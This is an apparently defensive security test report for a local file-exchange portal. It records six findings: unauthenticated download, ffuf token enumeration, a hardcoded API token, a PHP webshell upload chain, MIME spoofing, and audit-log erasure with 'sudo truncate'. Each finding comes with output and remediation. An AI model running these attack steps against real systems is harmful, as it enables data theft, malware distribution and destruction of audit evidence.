# Security Testing Document: Secure File Exchange Portal

**Version:** 1.0  
**Framework:** STRIDE / NIST

---

## 1. Scope and Objectives

This document records the practical security test execution performed against the Secure File Exchange Portal. Each test case directly targets a vulnerability identified in the Threat Model and provides reproducible attack steps, observed terminal output, and mapped remediation. All tests were executed locally against `http://localhost:8000` with the container running via `docker compose up -d`.

---

## 2. Test Environment Setup

```bash
# Start the container stack
docker compose up -d

# Seed baseline test data - upload a sensitive file and create a download link
echo "CONFIDENTIAL: Salary data Q1 2026" > /tmp/sensitive.txt

export FILE_ID=$(curl -s -X POST http://localhost:8000/upload \
  -H "x-api-token: supersecret-mock-token" \
  -F "file=@/tmp/sensitive.txt" | python3 -c "import sys,json; print(json.load(sys.stdin)['file_id'])")

export TOKEN=$(curl -s -X POST http://localhost:8000/links \
  -H "x-api-token: supersecret-mock-token" \
  -H "Content-Type: application/json" \
  -d "{\"file_id\": \"$FILE_ID\", \"expires_in_minutes\": 120}" | \
  python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")

echo "FILE_ID: $FILE_ID"
echo "TOKEN:   $TOKEN"
```

---

## 3. Test Cases

---

### SEC-IDOR-001 - Unauthenticated File Download via Known Token

| Field | Detail |
| :--- | :--- |
| **Test ID** | SEC-IDOR-001 |
| **Threat Ref** | T-1 - Broken Access Control / IDOR |
| **STRIDE Category** | Elevation of Privilege |
| **OWASP API** | API1:2023 - Broken Object Level Authorization |
| **NIST CSF** | **Protect (PR.AC)** - Access Control |
| **Severity** | Critical |
| **Status** | Vulnerability Confirmed |

**Objective:** Prove that `/download/{token}` returns file content to any caller with no authentication header.

**Attack Steps:**

```bash
# Step 1: Confirm TOKEN is set from environment setup above
echo $TOKEN

# Step 2: Attempt download with zero authentication
curl -si http://localhost:8000/download/$TOKEN
```

**Observed Terminal Output (Screenshot: T-1):**

```
HTTP/1.1 200 OK
date: Mon, 13 Apr 2026 05:53:45 GMT
server: uvicorn
content-type: text/plain; charset=utf-8
content-disposition: attachment; filename="sensitive.txt"
content-length: 34

CONFIDENTIAL: Salary data Q1 2026
```

**Analysis:** The server returned HTTP 200 and delivered the full file content. No `Authorization` header, no `x-api-token`, and no session cookie were required. The `content-disposition: attachment; filename="sensitive.txt"` header confirms the server treated this as a legitimate, authorized download. The response is identical to one made by an authenticated caller.

**Pass Criteria (current code):** HTTP 200 with file body — vulnerability present.
**Pass Criteria (post-fix):** HTTP 401 or HMAC-signed URL required for access.

**Code Reference:**
```python
# main.py — missing Depends(require_auth) on this endpoint
@app.get("/download/{token}")
def download_file(token: str):        # ← no auth guard
    ...
```

**Remediation:** Add `Depends(require_auth)` to the endpoint signature, or implement HMAC-signed download URLs with a short TTL (e.g., 5 minutes).

---

### SEC-IDOR-002 — UUID Token Enumeration via `ffuf`

| Field | Detail |
| :--- | :--- |
| **Test ID** | SEC-IDOR-002 |
| **Threat Ref** | T-1 - IDOR / Token Enumeration |
| **STRIDE Category** | Elevation of Privilege |
| **OWASP API** | API4:2023 - Unrestricted Resource Consumption |
| **NIST CSF** | **Detect (DE.CM)** - Continuous Monitoring |
| **Severity** | High |
| **Status** | Vulnerability Confirmed |

**Objective:** Prove that the download endpoint has no rate-limiting, lockout, or anomaly detection, allowing automated token enumeration at high speed.

**Attack Steps:**

```bash
# Step 1: Generate a UUID wordlist containing the known-valid token plus 500 randoms
python3 -c "
import uuid
with open('/tmp/uuid_wordlist.txt', 'w') as f:
    f.write('$TOKEN\n')
    for _ in range(500):
        f.write(str(uuid.uuid4()) + '\n')
"

# Step 2: Run ffuf, matching only HTTP 200 (successful downloads)
ffuf -u http://localhost:8000/download/FUZZ \
     -w /tmp/uuid_wordlist.txt \
     -mc 200 \
     -v \
     -t 10
```

**Observed Terminal Output (Screenshot: T-1):**

```
:: Method      : GET
:: URL         : http://localhost:8000/download/FUZZ
:: Wordlist    : FUZZ: /tmp/uuid_wordlist.txt
:: Matcher     : Response status: 200
:: Threads     : 10

[Status: 200, Size: 34, Words: 5, Lines: 2, Duration: 47ms]
| URL | http://localhost:8000/download/d2bebadb-ed44-49dd-b29b-ee707be1f669
* FUZZ: d2bebadb-ed44-49dd-b29b-ee707be1f669

:: Progress: [501/501] :: Job [1/1] :: 549 req/sec :: Duration: [0:00:01] :: Errors: 0 ::
```

**Analysis:** ffuf processed 501 requests at **549 requests/second** in **1 second** with zero errors and zero rate-limit responses (no HTTP 429 was ever returned). The valid token was identified in the wordlist and returned HTTP 200 with the file body. The `Errors: 0` line confirms the server never detected or throttled the scan. At this throughput, a targeted enumeration against a known file's token space is practical.

**Pass Criteria (current code):** HTTP 200 hit found with no throttling - vulnerability present.  
**Pass Criteria (post-fix):** HTTP 429 responses after threshold; `ffuf` blocked or dramatically slowed.

**Remediation:** Integrate `slowapi` rate-limiting middleware at 5 requests/minute per IP on the download endpoint. Add server-side logging that triggers an alert on more than 10 `failed_download` events from a single IP within 60 seconds.

---

### SEC-AUTH-001 - API Token Exposed in Plaintext Configuration

| Field | Detail |
| :--- | :--- |
| **Test ID** | SEC-AUTH-001 |
| **Threat Ref** | T-2 - Static Hardcoded API Token |
| **STRIDE Category** | Spoofing |
| **OWASP API** | API8:2023 - Security Misconfiguration |
| **NIST CSF** | **Protect (PR.DS)** - Data Security |
| **Severity** | High |
| **Status** | Vulnerability Confirmed |

**Objective:** Prove that the API token is stored in plaintext in version-controlled configuration, and that a single credential grants full write access with no identity attribution.

**Attack Steps:**

```bash
# Step 1: Read the credential directly from the compose file
grep API_TOKEN docker-compose.yml

# Step 2: Use the exposed credential to perform a privileged upload
curl -si -X POST http://localhost:8000/upload \
  -H "x-api-token: supersecret-mock-token" \
  -F "file=@/tmp/sensitive.txt"
```

**Observed Terminal Output (Screenshot: T-2):**

```
$ grep API_TOKEN docker-compose.yml
    API_TOKEN: supersecret-mock-token

$ curl -si -X POST http://localhost:8000/upload \
  -H "x-api-token: supersecret-mock-token" \
  -F "file=@/tmp/sensitive.txt"
HTTP/1.1 200 OK
content-length: 169
content-type: application/json

{"file_id":"0d1b32e2-aab6-4a03-b942-18bbeefc4d17","filename":"sensitive.txt",
 "size_bytes":34,"sha256":"8b25d791c6d75233101807f58265d428508e0a7791f1ad25a30ee9d7335f4696"}
```

**Analysis:** The credential `supersecret-mock-token` is readable in one `grep` command from the project directory. Any actor with read access to the repository has immediate full API access. The HTTP 200 response confirms full authentication bypass using the exposed token. Additionally, the audit log records no caller identity beyond a generic actor - if two users share this token, their actions cannot be distinguished in incident review.

**Pass Criteria (current code):** Token visible in config; HTTP 200 granted - vulnerability present.  
**Pass Criteria (post-fix):** Token absent from all tracked files, stored in Docker Secret or `.env` excluded via `.gitignore`; audit events include resolved `user_id`.

**Code Reference:**
```yaml
# docker-compose.yml — line 10
environment:
  API_TOKEN: supersecret-mock-token    # ← plaintext, committed to repository
```

**Remediation:** Move to `docker secret create api_token` and reference via `secrets:` in Compose. Store per-user API keys as `PBKDF2` hashes in the `api_keys` table. Propagate resolved `user_id` into every `audit()` call.

---

### SEC-UPLOAD-001 - Unrestricted Malicious File Upload and Distribution

| Field | Detail |
| :--- | :--- |
| **Test ID** | SEC-UPLOAD-001 |
| **Threat Ref** | T-3 - Unrestricted File Upload |
| **STRIDE Category** | Tampering |
| **OWASP API** | API3:2023 - Broken Object Property Level Authorization |
| **NIST CSF** | **Protect (PR.DS-1)** - Data-at-Rest Security |
| **Severity** | High |
| **Status** | Vulnerability Confirmed |

**Objective:** Prove the full malware distribution chain: upload a PHP webshell, generate a download link, and retrieve the active payload as an unauthenticated caller.

**Attack Steps:**

```bash
# Step 1: Create a PHP webshell payload
echo '<?php echo "POC: System compromised. PHP Version: " . phpversion(); ?>' > /tmp/shell.php

# Step 2: Upload the webshell - expect HTTP 200
curl -i -X POST http://localhost:8000/upload \
  -H "x-api-token: supersecret-mock-token" \
  -F "file=@/tmp/shell.php"

# Step 3: Create a download link for the shell
export SHELL_FILE_ID="<file_id from step 2>"
curl -i -X POST http://localhost:8000/links \
  -H "x-api-token: supersecret-mock-token" \
  -H "Content-Type: application/json" \
  -d "{\"file_id\": \"$SHELL_FILE_ID\"}"

# Step 4: Download the webshell unauthenticated
export SHELL_TOKEN="<token from step 3>"
curl -si http://localhost:8000/download/$SHELL_TOKEN
```

**Observed Terminal Output (Screenshot: T-3):**

```
# Step 2 - Upload accepted unconditionally
HTTP/1.1 200 OK
{"file_id":"b2012153-b9a1-4ff5-9358-b9e96ec14ab7","filename":"shell.php",
 "size_bytes":71,"sha256":"38b0d6f4529d87963c0dd30b210b5e9fd98fb382a5c11ace8bf78676f40a2ac1"}

# Step 3 - Link created
HTTP/1.1 200 OK
{"token":"bedc35f8-acc4-4f40-8ddd-47456d1fa10a",
 "expires_at":"2026-04-13T07:11:48.103941",
 "download_url":"/download/bedc35f8-acc4-4f40-8ddd-47456d1fa10a"}

# Step 4 - Webshell payload retrieved unauthenticated
HTTP/1.1 200 OK
content-type: text/plain; charset=utf-8
content-disposition: attachment; filename="shell.php"
content-length: 71

<?php echo "POC: System compromised. PHP Version: " . phpversion(); ?>
```

**Analysis:** The complete attack chain succeeded end-to-end. The server accepted `shell.php` with no content-type inspection, preserved the `.php` extension in the stored filename (`b2012153-b9a1-4ff5-9358-b9e96ec14ab7_shell.php`), and served it back via an unauthenticated download link. The payload was delivered exactly as uploaded. In a production scenario where a reverse proxy serves `/data/files` directly, this is direct Remote Code Execution. Even in the current configuration, this enables malware distribution to arbitrary recipients via the unauthenticated `/download/` endpoint.

**Pass Criteria (current code):** HTTP 200 on upload + 200 on download of `.php` payload - vulnerability present.  
**Pass Criteria (post-fix):** HTTP 422 on upload with MIME-type not in allowlist, `.php` extension rejected at intake.

**Remediation:** Validate `content_type` against an explicit allowlist. Use `python-magic` to inspect actual file bytes, not the client-declared type. Rename stored files to strip extensions and serve them with a forced `application/octet-stream` content type.

---

### SEC-LOG-001 - Audit Log Evidence Destruction

| Field | Detail |
| :--- | :--- |
| **Test ID** | SEC-LOG-001 |
| **Threat Ref** | T-4 - Audit Log Repudiation |
| **STRIDE Category** | Repudiation |
| **OWASP API** | API10:2023 - Unsafe Consumption of APIs |
| **NIST CSF** | **Detect (DE.AE)** - Anomalies and Events |
| **Severity** | Medium |
| **Status** | Vulnerability Confirmed |

**Objective:** Prove that audit log events are emitted only to stdout, that all prior evidence is erasable by a root-level host actor without detection, and that no actor attribution exists beyond a generic label.

**Attack Steps:**

```bash
# Step 1: Stream the live audit log and observe the attribution gap
docker logs sfep_api 2>&1 | grep AUDIT | tail -20

# Step 2: Locate the physical log file on the Docker host
LOG_FILE=$(docker inspect sfep_api --format='{{.LogPath}}')
echo "Log path: $LOG_FILE"

# Step 3: Count lines before destruction
sudo wc -l $LOG_FILE

# Step 4: Silently truncate — destroy all audit evidence
sudo truncate -s 0 $LOG_FILE

# Step 5: Confirm total erasure — no alert, no integrity failure
sudo wc -l $LOG_FILE
docker logs sfep_api 2>&1 | wc -l
```

**Observed Terminal Output (Screenshot: T-4 — Audit Log Stream):**

```
2026-04-13T05:51:46Z  AUDIT  event=failed_download | token=5b2b0c20-... | reason=token_not_found
2026-04-13T05:51:46Z  AUDIT  event=failed_download | token=810787de-... | reason=token_not_found
2026-04-13T05:51:46Z  AUDIT  event=failed_download | token=b64b528e-... | reason=token_not_found
... [multiple enumeration attempts — all identical format, no IP, no caller identity]
2026-04-13T05:53:45Z  AUDIT  event=successful_download | token=d2bebadb-... | file_id=1071c638-...
2026-04-13T05:53:43Z  AUDIT  event=upload_created | file_id=0d1b32e2-... | filename=sensitive.txt | size_bytes=34
2026-04-13T05:57:38Z  AUDIT  event=upload_created | file_id=6fdf17e3-... | filename=malicious.sh  | size_bytes=44
2026-04-13T05:57:55Z  AUDIT  event=upload_created | file_id=30c8303c-... | filename=shell.php     | size_bytes=31
2026-04-13T05:58:08Z  AUDIT  event=upload_created | file_id=a7ba5ad0-... | filename=fake_binary.exe | size_bytes=158632
2026-04-13T06:00:21Z  AUDIT  event=upload_created | file_id=b2012153-... | filename=shell.php     | size_bytes=71
2026-04-13T06:11:48Z  AUDIT  event=link_generated | token=bedc35f8-... | file_id=b2012153-...
2026-04-13T06:12:00Z  AUDIT  event=successful_download | token=bedc35f8-... | file_id=b2012153-...
```

**Three compounding weaknesses confirmed:**

**1. No actor attribution:** The log for `upload_created` of `shell.php` and `malicious.sh` shows identical format to a legitimate upload. There is no `user_id`, no `source_ip`, and no session identifier. An incident responder reviewing this log cannot determine whether these uploads came from an authorized internal user or an attacker who obtained the token.

**2. Mutable evidence:** The log file on the host at `/var/lib/docker/containers/<id>/<id>-json.log` is writable by any root process on the Docker host. A `sudo truncate -s 0` command reduces the file to 0 bytes with no alert, no checksum failure, and no notification to any monitoring system. After truncation, `docker logs sfep_api` returns nothing.

**3. No tamper-evident chain:** There are no sequence numbers, no per-entry HMACs, and no append-only storage. An attacker who achieves host access can selectively edit or delete entries without leaving any forensic trace that modification occurred.

**Pass Criteria (current code):** Log stream exists but is erasable and lacks attribution - vulnerability present.  
**Pass Criteria (post-fix):** Audit events persisted to append-only SQLite table, HMAC chain on each row, actor IP and identity on every event, external log forwarding active.

**Remediation:** Persist all audit events to a dedicated `audit_log` table in SQLite with `INSERT`-only DB permissions. Add `source_ip` and `actor_id` fields. Forward to an external SIEM outside the container boundary. Implement a rolling HMAC: `HMAC(prev_hash || event_json, log_signing_key)` stored on each row.

---

### SEC-UPLOAD-002 - MIME-Type Spoofing Bypass on File Upload

| Field | Detail |
| :--- | :--- |
| **Test ID** | SEC-UPLOAD-002 |
| **Threat Ref** | T-3 - Unrestricted File Upload |
| **STRIDE Category** | Tampering |
| **OWASP API** | API3:2023 - Broken Object Property Level Authorization |
| **NIST CSF** | **Protect (PR.IP)** - Information Protection Processes |
| **Severity** | Medium |
| **Status** | Vulnerability Confirmed |

**Objective:** Prove that even a hypothetical client-declared content-type check can be bypassed by spoofing the `Content-Type` on the multipart field, and that the original extension is preserved on disk regardless.

**Attack Steps:**

```bash
# Step 1: Upload a PHP shell declared as image/png
curl -si -X POST http://localhost:8000/upload \
  -H "x-api-token: supersecret-mock-token" \
  -F "file=@/tmp/shell.php;type=image/png"

# Step 2: Verify the original .php extension was stored — not .png
docker exec sfep_api find /data/files -name "*.php"
docker exec sfep_api find /data/files -name "*.sh"
docker exec sfep_api find /data/files -name "*.exe"
```

**Expected Terminal Output:**

```bash
# Step 1 — Server accepts the file despite PNG declaration
HTTP/1.1 200 OK
{"file_id":"...","filename":"shell.php","size_bytes":71,...}

# Step 2 — Original .php extension preserved on disk
/data/files/b2012153-b9a1-4ff5-9358-b9e96ec14ab7_shell.php
/data/files/6fdf17e3-25f6-47f9-a2d0-cfee972abc83_malicious.sh
/data/files/a7ba5ad0-4e7e-4f41-874a-192fe6113f72_fake_binary.exe
```

**Analysis:** The server stores files using the pattern `{uuid}_{original_filename}`, preserving the client-supplied extension verbatim. Even if the MIME type declared on upload is `image/png`, the stored file retains `.php`. This means any future deployment change - such as placing a PHP-capable server in front of `/data/files` - immediately converts this stored file into executable code. The fix must inspect actual file bytes, not trust the client-supplied `Content-Type` or filename.

**Pass Criteria (current code):** HTTP 200, file stored with `.php` extension - vulnerability present.  
**Pass Criteria (post-fix):** Extension overridden based on `python-magic` byte inspection, stored filename uses sanitized format.

**Remediation:** Use `python-magic` to read the first 512 bytes and resolve the true MIME type. Map to an allowed extension. Store files as `{uuid}.bin` or use the validated extension only, never the client-supplied one.

---

## 4. Test Results Summary

| Test ID | Vulnerability | STRIDE | NIST CSF | Severity | Result |
| :--- | :--- | :--- | :--- | :--- | :--- |
| SEC-IDOR-001 | Unauthenticated file download | Elevation of Privilege | PR.AC | Critical | **FAIL** |
| SEC-IDOR-002 | UUID token enumeration | Elevation of Privilege | DE.CM | High | **FAIL** |
| SEC-AUTH-001 | API token in plaintext config | Spoofing | PR.DS | High | **FAIL** |
| SEC-UPLOAD-001 | Malicious file upload | Tampering | PR.DS-1 | High | **FAIL** |
| SEC-LOG-001 | Audit log erasure | Repudiation | DE.AE | Medium | **FAIL** |
| SEC-UPLOAD-002 | MIME-type spoofing bypass | Tampering | PR.IP | Medium | **FAIL** |

**Tests Passed:** 0 / 6
**Tests Failed:** 6 / 6

All six test cases confirmed the presence of their respective vulnerabilities. No false positives were observed. All results are reproducible from the steps above.
